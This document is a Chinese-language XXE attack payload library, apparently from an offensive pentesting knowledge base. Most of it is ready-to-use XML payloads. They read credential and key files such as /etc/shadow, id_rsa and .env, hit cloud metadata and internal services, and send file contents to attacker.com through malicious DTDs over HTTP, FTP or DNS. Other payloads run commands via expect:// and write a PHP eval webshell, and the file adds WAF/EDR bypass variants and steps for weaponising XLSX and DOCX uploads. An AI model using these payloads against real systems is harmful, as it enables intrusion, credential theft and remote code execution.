# RCE — XXE 实体注入 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖基础 XXE / 盲注 / OOB 外带 / XXE+SSRF / XXE 到 RCE / 文件读 / 外部 DTD / XLSX / DOCX。任何 XML 解析点或 Office 文件上传点都试一遍。

---

### XXE基础攻击  `xxe-basic`
XML外部实体注入基础攻击技术
子类：**基础攻击** · tags: `xxe` `xml` `external` `entity`

**前置条件：** 存在XML解析功能；外部实体未被禁用

**攻击链：**

**1. 1. 探测XXE**
_基础XXE测试_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**2. 2. 读取文件**  _[windows]_
_读取Windows文件_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

**3. 3. 读取PHP源码**
_使用PHP Filter读取源码_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

**4. 4. SSRF攻击**
_利用XXE进行SSRF_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

**WAF/EDR 绕过变体：**

**1. 参数实体**
_使用参数实体绕过_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**2. 编码绕过**
_使用编码绕过_
```
<?xml version="1.0" encoding="UTF-16"?>
使用不同编码绕过WAF
```

---

### 盲注XXE攻击  `xxe-blind`
无回显的XXE攻击技术
子类：**盲注XXE** · tags: `xxe` `blind` `oob` `xml`

**前置条件：** 存在XML解析；无直接回显

**攻击链：**

**1. 1. 外部实体探测**
_使用外部实体探测_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>
```

**2. 2. 参数实体**
_使用参数实体_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>
```

**3. 3. OOB外带数据**
_OOB外带文件内容_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>

# xxe.dtd内容
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
使用UTF-16编码XML文档
绕过WAF检测
```

---

### XXE OOB外带攻击  `xxe-oob`
利用OOB技术外带XXE数据
子类：**OOB外带** · tags: `xxe` `oob` `exfiltration` `xml`

**前置条件：** 存在XXE漏洞；可发起外部请求

**攻击链：**

**1. 1. HTTP外带**
_HTTP外带数据_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

**2. 2. FTP外带**
_FTP外带数据_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

**3. 3. DNS外带**
_DNS外带_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/log?file=/etc/passwd">
]>
<foo>&xxe;</foo>

# 或使用子域名
<!ENTITY xxe SYSTEM "http://filecontent.attacker.com/">
```

**WAF/EDR 绕过变体：**

**1. 使用CDATA**
_CDATA包装_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>
```

---

### XXE+SSRF组合攻击  `xxe-ssrf`
利用XXE实现SSRF攻击
子类：**XXE+SSRF** · tags: `xxe` `ssrf` `combination` `xml`

**前置条件：** 存在XXE漏洞；内网可访问

**攻击链：**

**1. 1. 扫描内网端口**
_扫描内网端口_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<foo>&xxe;</foo>

# 批量扫描
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
```

**2. 2. 访问内网服务**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">
]>
<foo>&xxe;</foo>

# 访问Redis
# 访问内部API
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
使用不同编码格式绕过IP过滤
```

---

### XXE到RCE  `xxe-rce`
利用XXE实现远程代码执行
子类：**XXE到RCE** · tags: `xxe` `rce` `php` `expect`

**前置条件：** 存在XXE漏洞；PHP expect扩展加载

**攻击链：**

**1. 1. Expect扩展RCE**
_使用expect协议执行命令_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>

# 执行任意命令
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
```

**2. 2. 写入WebShell**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://echo '<?php eval($_POST[cmd]);?>' > /var/www/html/shell.php">
]>
<foo>&xxe;</foo>
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
使用Base64或其他编码绕过命令过滤
```

---

### XXE文件读取  `xxe-file-read`
利用XXE读取服务器文件
子类：**文件读取** · tags: `xxe` `file` `read` `lfi`

**前置条件：** 存在XXE漏洞；有文件读取权限

**攻击链：**

**1. 1. 读取Linux文件**  _[linux]_
_读取Linux系统文件_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///etc/shadow
file:///etc/hosts
file:///root/.ssh/id_rsa
file:///proc/self/environ
```

**2. 2. 读取Windows文件**  _[windows]_
_读取Windows系统文件_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
```

**3. 3. 读取Web配置**
_读取Web应用配置_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<foo>&xxe;</foo>

# 常见配置文件
file:///var/www/html/wp-config.php
file:///app/.env
file:///app/config/database.yml
```

**4. 4. 读取源代码**
_使用PHP Filter读取源码_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<foo>&xxe;</foo>
```

**WAF/EDR 绕过变体：**

**1. 使用参数实体**
_参数实体绕过_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY bar "%xxe;">
]>
<foo>&bar;</foo>
```

---

### XXE外部DTD利用  `xxe-dtd`
利用外部DTD文件进行XXE攻击
子类：**外部DTD** · tags: `xxe` `dtd` `external` `xml`

**前置条件：** 存在XXE漏洞；可访问外部DTD

**攻击链：**

**1. 1. 托管恶意DTD**
_创建恶意DTD文件_
```
# 在攻击者服务器创建evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**2. 2. 引用外部DTD**
_引用外部DTD文件_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>
```

**3. 3. 多步骤外带**
_处理特殊字符_
```
# evil.dtd - 多步骤外带
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "%start;%file;%end;">
```

**4. 4. 错误消息泄露**
_错误消息外带_
```
# 利用错误消息泄露数据
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

# 错误消息中会包含文件内容
```

**WAF/EDR 绕过变体：**

**1. 使用HTTPS**
_HTTPS绕过_
```
使用HTTPS托管DTD文件绕过HTTP过滤
```

---

### XLSX文件XXE  `xxe-xlsx`
利用XLSX文件进行XXE攻击
子类：**XLSX文件XXE** · tags: `xxe` `xlsx` `excel` `office`

**前置条件：** 应用解析XLSX文件；存在XXE漏洞

**攻击链：**

**1. 1. 解压XLSX文件**
_解压XLSX文件_
```
# XLSX本质是ZIP文件
unzip spreadsheet.xlsx

# 主要文件结构
xl/workbook.xml
xl/worksheets/sheet1.xml
xl/sharedStrings.xml
[Content_Types].xml
```

**2. 2. 注入XXE Payload**
```
# 修改xl/workbook.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="...">
&xxe;
</workbook>
```

**WAF/EDR 绕过变体：**

**1. 修改Content_Types**
_修改Content_Types_
```
修改[Content_Types].xml注入XXE
```

---

### DOCX文件XXE  `xxe-docx`
利用DOCX文件进行XXE攻击
子类：**DOCX文件XXE** · tags: `xxe` `docx` `word` `office`

**前置条件：** 应用解析DOCX文件；存在XXE漏洞

**攻击链：**

**1. 1. 解压DOCX文件**
_解压DOCX文件_
```
# DOCX本质是ZIP文件
unzip document.docx

# 主要文件结构
word/document.xml
word/_rels/document.xml.rels
[Content_Types].xml
```

**2. 2. 注入XXE Payload**
```
# 修改word/document.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="...">
<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
</w:document>
```

**WAF/EDR 绕过变体：**

**1. 修改关系文件**
_修改关系文件_
```
修改_rels/.rels或document.xml.rels注入XXE
```

---


---

← 回 [00-index.md](00-index.md)
